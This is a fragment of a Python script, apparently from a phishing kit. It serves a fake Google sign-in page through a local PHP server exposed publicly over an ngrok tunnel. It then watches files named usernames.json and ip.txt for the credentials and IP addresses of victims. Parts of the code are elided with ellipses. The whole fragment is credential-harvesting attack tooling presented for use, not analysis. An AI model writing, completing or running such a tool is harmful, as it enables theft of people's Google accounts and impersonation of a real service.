...
a = open("../Fake-page/site/google/usernames.json","w")
b = a.write("")
a.close

i = open("../Fake-page/site/google/ip.txt","w")
o = i.write("")
i.close
    ...
    if os.name == "nt":
        ...
        def server():
            with open("server.log","w") as phplog:
                Popen(("php","-S","localhost:2020","-t","../Fake-page/site/google"),stdout=phplog,stderr=phplog)
        
        server()
        link = ngrok.connect(2020,"http",auth_token=token)
        ...
        def user():
            global sf
            if not str(os.stat("../Fake-page/site/google/usernames.json").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/google/usernames.json").st_size)
                file = open("../Fake-page/site/google/usernames.json","r")
                rfile = file.read()
                try:
        ...
        def ip():
            global sf
            if not str(os.stat("../Fake-page/site/google/ip.txt").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/google/ip.txt").st_size)
                ipfile= open("../Fake-page/site/google/ip.txt","r")
